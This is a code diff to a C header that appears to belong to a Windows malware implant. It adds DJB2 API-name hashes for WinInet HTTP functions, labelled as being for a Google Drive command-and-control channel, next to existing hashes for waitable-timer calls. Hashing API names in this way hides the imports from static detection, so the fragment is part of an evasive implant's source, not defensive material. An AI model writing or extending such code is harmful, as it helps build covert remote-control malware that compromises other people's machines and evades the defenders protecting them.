@@ -53,4 +53,12 @@ static __forceinline uint32_t HashStringDjb2W(const wchar_t *str) {
 #define HASH_CreateWaitableTimerW       0x0604C949
 #define HASH_SetWaitableTimer           0xF503B838
 
+// WinInet Hashes for GDrive C2
+#define HASH_InternetOpenW              0xF2123177
+#define HASH_InternetConnectW           0x60E96A2F
+#define HASH_HttpOpenRequestW           0x0D92C2B7
+#define HASH_HttpSendRequestW           0xADE71E8F
+#define HASH_InternetReadFile           0x17E5976A
+#define HASH_InternetCloseHandle        0x23E40FB0
+
 #endif // API_HASHES_H
